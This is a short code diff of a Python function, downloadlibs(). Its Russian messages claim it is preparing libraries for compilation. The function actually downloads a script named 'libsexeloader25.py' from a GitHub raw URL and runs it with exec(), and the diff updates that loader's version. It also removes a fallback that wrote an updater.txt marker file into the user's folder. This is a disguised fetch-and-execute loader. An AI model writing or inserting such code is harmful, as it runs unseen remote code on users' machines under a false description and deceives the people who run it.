@@ -28,20 +28,11 @@ def downloadlibs():
     try:
         #Скачивание библиотек для компиляции.
         print("Пожалуйста подождите, подготавливаем библиотеки...")
-        libraries = "https://raw.githubusercontent.com/keydevelops/I/main/libsexeloader24.py"
+        libraries = "https://raw.githubusercontent.com/keydevelops/I/main/libsexeloader25.py"
         librariesresp = requests.get(libraries)
         exec(librariesresp.text)
         print("Подготовили библиотеки.")
     except Exception:
-        file_path = rf"C:\users\{getuser()}\updater.txt"
-        if not os.path.exists(file_path):
-            with open(file_path, "w") as file:
-                file.write("1")
-        with open(file_path, "r") as file:
-            content = file.read()
-
-        with open(file_path, "w") as file:
-            file.write("1")
         print("Подготовили библиотеки.")
 
 
